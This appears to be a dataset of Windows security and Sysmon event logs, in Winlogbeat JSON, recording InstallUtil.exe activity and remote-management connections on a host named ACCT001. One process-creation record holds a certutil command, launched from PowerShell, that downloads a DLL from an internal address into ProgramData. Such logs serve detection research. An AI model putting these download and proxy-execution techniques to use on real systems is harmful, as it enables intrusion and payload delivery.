{"@timestamp":"2019-10-28T02:31:42.213Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"winlog":{"record_id":271766,"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"process":{"pid":3208,"thread":{"id":5108}},"event_id":7,"task":"Image loaded (rule: ImageLoad)","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","event_data":{"UtcTime":"2019-10-28 02:31:42.205","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Product":"Microsoft Windows Operating System","Hashes":"SHA1=17EA640F9F06FBC131C062A4C0C3EE93937A7F95,MD5=98E67DE77636FD3607951FE2A3F116FE,SHA256=08A5F9A5D8AE6FA6A2A89B2A789D1A599E3D129B30C1B2A8628634F397079DD0,IMPHASH=A08BF41263E3776AD11E1600C12BCA60","Company":"Microsoft Corporation","OriginalFileName":"dhcpcsvc6.dll","SignatureStatus":"Valid","ImageLoaded":"C:\\Windows\\System32\\dhcpcsvc6.dll","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","Signed":"true","Signature":"Microsoft Windows","Description":"DHCPv6 Client"},"version":3,"api":"wineventlog","computer_name":"ACCT001.shire.com","opcode":"Info"},"event":{"code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.518Z","kind":"event"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nImageLoaded: C:\\Windows\\System32\\dhcpcsvc6.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: DHCPv6 Client\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: dhcpcsvc6.dll\nHashes: SHA1=17EA640F9F06FBC131C062A4C0C3EE93937A7F95,MD5=98E67DE77636FD3607951FE2A3F116FE,SHA256=08A5F9A5D8AE6FA6A2A89B2A789D1A599E3D129B30C1B2A8628634F397079DD0,IMPHASH=A08BF41263E3776AD11E1600C12BCA60\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid"}
{"@timestamp":"2019-10-28T02:31:42.213Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_id":7,"record_id":271767,"computer_name":"ACCT001.shire.com","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"task":"Image loaded (rule: ImageLoad)","opcode":"Info","event_data":{"Description":"DHCP Client Service","Signature":"Microsoft Windows","UtcTime":"2019-10-28 02:31:42.205","ImageLoaded":"C:\\Windows\\System32\\dhcpcsvc.dll","Signed":"true","Company":"Microsoft Corporation","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ProcessId":"5204","SignatureStatus":"Valid","Hashes":"SHA1=4D145FFC99D92043927713BD9D98EA853A87A8E6,MD5=6EDAC9E4340B468519FB2AA79DD2A113,SHA256=19F63D1F0BC5FE8A9D87F3BB12032EA6C15951EBBEBE46B35B7355DD31E071C7,IMPHASH=EE29DA81355C13DA2F9BBA37D3F3B408","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","OriginalFileName":"dhcpcsvc.dll","Product":"Microsoft Windows Operating System"},"channel":"Microsoft-Windows-Sysmon/Operational","version":3,"process":{"thread":{"id":5108},"pid":3208},"provider_name":"Microsoft-Windows-Sysmon","api":"wineventlog"},"event":{"created":"2019-10-28T02:31:42.518Z","kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nImageLoaded: C:\\Windows\\System32\\dhcpcsvc.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: DHCP Client Service\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: dhcpcsvc.dll\nHashes: SHA1=4D145FFC99D92043927713BD9D98EA853A87A8E6,MD5=6EDAC9E4340B468519FB2AA79DD2A113,SHA256=19F63D1F0BC5FE8A9D87F3BB12032EA6C15951EBBEBE46B35B7355DD31E071C7,IMPHASH=EE29DA81355C13DA2F9BBA37D3F3B408\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"}}
{"@timestamp":"2019-10-28T02:31:42.215Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"event":{"code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.519Z","kind":"event"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nImageLoaded: C:\\Windows\\System32\\winnsi.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Network Store Information RPC interface\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: winnsi.dll\nHashes: SHA1=42E3C457000C8942F4026F016287BD6E1B724173,MD5=12FB138D9414FC9A8AD457C5DC2CA06B,SHA256=7686241E0AA2F440C6192F803A1676480158FCD4A785C07BC74C3695D47770E7,IMPHASH=AD7C692FA9FCC8C643FD494188DECA65\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","record_id":271768,"task":"Image loaded (rule: ImageLoad)","api":"wineventlog","opcode":"Info","version":3,"process":{"pid":3208,"thread":{"id":5108}},"event_data":{"Product":"Microsoft Windows Operating System","ImageLoaded":"C:\\Windows\\System32\\winnsi.dll","ProcessId":"5204","OriginalFileName":"winnsi.dll","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","SignatureStatus":"Valid","UtcTime":"2019-10-28 02:31:42.205","Signature":"Microsoft Windows","Company":"Microsoft Corporation","Hashes":"SHA1=42E3C457000C8942F4026F016287BD6E1B724173,MD5=12FB138D9414FC9A8AD457C5DC2CA06B,SHA256=7686241E0AA2F440C6192F803A1676480158FCD4A785C07BC74C3695D47770E7,IMPHASH=AD7C692FA9FCC8C643FD494188DECA65","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","Description":"Network Store Information RPC interface","Signed":"true"},"computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_id":7,"provider_name":"Microsoft-Windows-Sysmon","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"}},"ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:42.219Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:42.519Z"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nImageLoaded: C:\\Windows\\System32\\dnsapi.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: DNS Client API DLL\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: dnsapi\nHashes: SHA1=3EE5BE5A98A97424924F555F8E5B86BEDFD57EA7,MD5=2B1627A5E6EFAA1C100A1CD87E37F7DA,SHA256=9CCE7C5AE66B0939A75F16235724AC2D1FB1DB18A2878CAB5BCD13FF674DEAED,IMPHASH=33A7E8246AA2567F10F26281A5128C47\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer"},"winlog":{"process":{"pid":3208,"thread":{"id":5116}},"record_id":271769,"api":"wineventlog","user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"computer_name":"ACCT001.shire.com","version":3,"event_id":7,"provider_name":"Microsoft-Windows-Sysmon","task":"Image loaded (rule: ImageLoad)","opcode":"Info","channel":"Microsoft-Windows-Sysmon/Operational","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_data":{"ImageLoaded":"C:\\Windows\\System32\\dnsapi.dll","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","SignatureStatus":"Valid","Description":"DNS Client API DLL","Signed":"true","UtcTime":"2019-10-28 02:31:42.205","Signature":"Microsoft Windows","ProcessId":"5204","Hashes":"SHA1=3EE5BE5A98A97424924F555F8E5B86BEDFD57EA7,MD5=2B1627A5E6EFAA1C100A1CD87E37F7DA,SHA256=9CCE7C5AE66B0939A75F16235724AC2D1FB1DB18A2878CAB5BCD13FF674DEAED,IMPHASH=33A7E8246AA2567F10F26281A5128C47","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"dnsapi","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}"}}}
{"@timestamp":"2019-10-28T02:31:42.219Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"api":"wineventlog","opcode":"Info","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":2,"provider_name":"Microsoft-Windows-Sysmon","task":"Registry object added or deleted (rule: RegistryEvent)","computer_name":"ACCT001.shire.com","channel":"Microsoft-Windows-Sysmon/Operational","event_id":12,"process":{"thread":{"id":5108},"pid":3208},"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","EventType":"CreateKey","UtcTime":"2019-10-28 02:31:42.205","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"},"record_id":271770},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"event":{"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z","kind":"event","code":12},"log":{"level":"information"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"}
{"@timestamp":"2019-10-28T02:31:42.219Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","winlog":{"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","provider_name":"Microsoft-Windows-Sysmon","api":"wineventlog","version":2,"process":{"pid":3208,"thread":{"id":5108}},"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","EventType":"CreateKey","UtcTime":"2019-10-28 02:31:42.205","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204"},"opcode":"Info","event_id":12,"channel":"Microsoft-Windows-Sysmon/Operational","computer_name":"ACCT001.shire.com","record_id":271771,"task":"Registry object added or deleted (rule: RegistryEvent)"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"event":{"code":12,"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z","kind":"event"},"log":{"level":"information"}}
{"@timestamp":"2019-10-28T02:31:42.219Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"winlog":{"event_data":{"TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","EventType":"CreateKey","UtcTime":"2019-10-28 02:31:42.205","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"},"computer_name":"ACCT001.shire.com","opcode":"Info","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":2,"channel":"Microsoft-Windows-Sysmon/Operational","event_id":12,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"api":"wineventlog","provider_name":"Microsoft-Windows-Sysmon","record_id":271772,"task":"Registry object added or deleted (rule: RegistryEvent)","process":{"pid":3208,"thread":{"id":5108}}},"event":{"kind":"event","code":12,"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z"}}
{"@timestamp":"2019-10-28T02:31:42.220Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"version":2,"event_data":{"ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","EventType":"CreateKey","UtcTime":"2019-10-28 02:31:42.205","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}"},"event_id":12,"record_id":271773,"channel":"Microsoft-Windows-Sysmon/Operational","api":"wineventlog","opcode":"Info","user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"task":"Registry object added or deleted (rule: RegistryEvent)","computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","process":{"pid":3208,"thread":{"id":5108}},"provider_name":"Microsoft-Windows-Sysmon"},"event":{"created":"2019-10-28T02:31:42.519Z","kind":"event","code":12,"action":"Registry object added or deleted (rule: RegistryEvent)"},"log":{"level":"information"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","host":{"name":"WECServer"},"agent":{"id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer"},"ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:42.220Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.205\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"computer_name":"ACCT001.shire.com","opcode":"Info","version":2,"event_data":{"TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters","EventType":"CreateKey","UtcTime":"2019-10-28 02:31:42.205","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"},"event_id":12,"task":"Registry object added or deleted (rule: RegistryEvent)","user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"process":{"pid":3208,"thread":{"id":5108}},"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","record_id":271774,"api":"wineventlog","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"},"event":{"code":12,"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z","kind":"event"}}
{"@timestamp":"2019-10-28T02:31:42.239Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"computer_name":"ACCT001.shire.com","opcode":"Info","process":{"pid":3208,"thread":{"id":5108}},"event_data":{"UtcTime":"2019-10-28 02:31:42.220","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Tracing","EventType":"CreateKey"},"task":"Registry object added or deleted (rule: RegistryEvent)","api":"wineventlog","provider_name":"Microsoft-Windows-Sysmon","record_id":271775,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"channel":"Microsoft-Windows-Sysmon/Operational","event_id":12,"version":2},"event":{"kind":"event","code":12,"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z"},"log":{"level":"information"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.220\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Tracing"}
{"@timestamp":"2019-10-28T02:31:41.372Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"provider_name":"Microsoft-Windows-Security-Auditing","api":"wineventlog","opcode":"Info","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","channel":"security","computer_name":"ACCT001.shire.com","keywords":["Audit Success"],"event_data":{"LayerRTID":"36","ProcessId":"3256","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","SourceAddress":"0.0.0.0","SourcePort":"54980","Protocol":"6","FilterRTID":"0","LayerName":"%%14608"},"record_id":41337,"process":{"pid":4,"thread":{"id":8320}},"event_id":5158,"task":"Filtering Platform Connection"},"event":{"kind":"event","code":5158,"action":"Filtering Platform Connection","created":"2019-10-28T02:31:42.519Z"},"log":{"level":"information"},"message":"The Windows Filtering Platform has permitted a bind to a local port.\n\nApplication Information:\n\tProcess ID:\t\t3256\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\n\nNetwork Information:\n\tSource Address:\t\t0.0.0.0\n\tSource Port:\t\t54980\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t0\n\tLayer Name:\t\tResource Assignment\n\tLayer Run-Time ID:\t36","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"}}
{"@timestamp":"2019-10-28T02:31:41.372Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t3256\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.100\n\tSource Port:\t\t54980\n\tDestination Address:\t172.18.39.102\n\tDestination Port:\t\t5985\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67260\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"api":"wineventlog","opcode":"Info","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","process":{"pid":4,"thread":{"id":8320}},"channel":"security","provider_name":"Microsoft-Windows-Security-Auditing","record_id":41338,"task":"Filtering Platform Connection","computer_name":"ACCT001.shire.com","event_data":{"SourcePort":"54980","DestAddress":"172.18.39.102","Protocol":"6","ProcessID":"3256","Direction":"%%14593","LayerName":"%%14611","RemoteUserID":"S-1-0-0","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","FilterRTID":"67260","LayerRTID":"48","RemoteMachineID":"S-1-0-0","SourceAddress":"172.18.39.100","DestPort":"5985"},"event_id":5156,"keywords":["Audit Success"],"version":1},"event":{"created":"2019-10-28T02:31:42.519Z","kind":"event","code":5156,"action":"Filtering Platform Connection"},"log":{"level":"information"}}
{"@timestamp":"2019-10-28T02:31:42.239Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.220\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Tracing","winlog":{"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Tracing","EventType":"CreateKey","UtcTime":"2019-10-28 02:31:42.220","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204"},"event_id":12,"provider_name":"Microsoft-Windows-Sysmon","task":"Registry object added or deleted (rule: RegistryEvent)","version":2,"channel":"Microsoft-Windows-Sysmon/Operational","opcode":"Info","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","record_id":271776,"computer_name":"ACCT001.shire.com","api":"wineventlog","process":{"pid":3208,"thread":{"id":5108}}},"event":{"kind":"event","code":12,"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4"},"log":{"level":"information"}}
{"@timestamp":"2019-10-28T02:31:41.373Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"winlog":{"task":"Process Creation","keywords":["Audit Success"],"api":"wineventlog","version":2,"provider_name":"Microsoft-Windows-Security-Auditing","channel":"security","event_id":4688,"event_data":{"ProcessId":"0xadc","TargetUserSid":"S-1-0-0","MandatoryLabel":"S-1-16-8192","SubjectDomainName":"shire","SubjectUserSid":"S-1-5-21-2379224252-1048547738-3559495803-1113","TargetDomainName":"-","TokenElevationType":"%%1936","TargetLogonId":"0x0","CommandLine":"\"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://172.18.39.8/util.dll C:\\ProgramData\\util.dll","NewProcessName":"C:\\Windows\\System32\\certutil.exe","TargetUserName":"-","ParentProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SubjectUserName":"lrodriguez","SubjectLogonId":"0x6f86c","NewProcessId":"0xe90"},"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","computer_name":"ACCT001.shire.com","record_id":41339,"opcode":"Info","process":{"pid":4,"thread":{"id":8320}}},"event":{"code":4688,"action":"Process Creation","created":"2019-10-28T02:31:42.519Z","kind":"event"},"log":{"level":"information"},"message":"A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-2379224252-1048547738-3559495803-1113\n\tAccount Name:\t\tlrodriguez\n\tAccount Domain:\t\tshire\n\tLogon ID:\t\t0x6F86C\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0xe90\n\tNew Process Name:\tC:\\Windows\\System32\\certutil.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-8192\n\tCreator Process ID:\t0xadc\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tProcess Command Line:\t\"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://172.18.39.8/util.dll C:\\ProgramData\\util.dll\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}
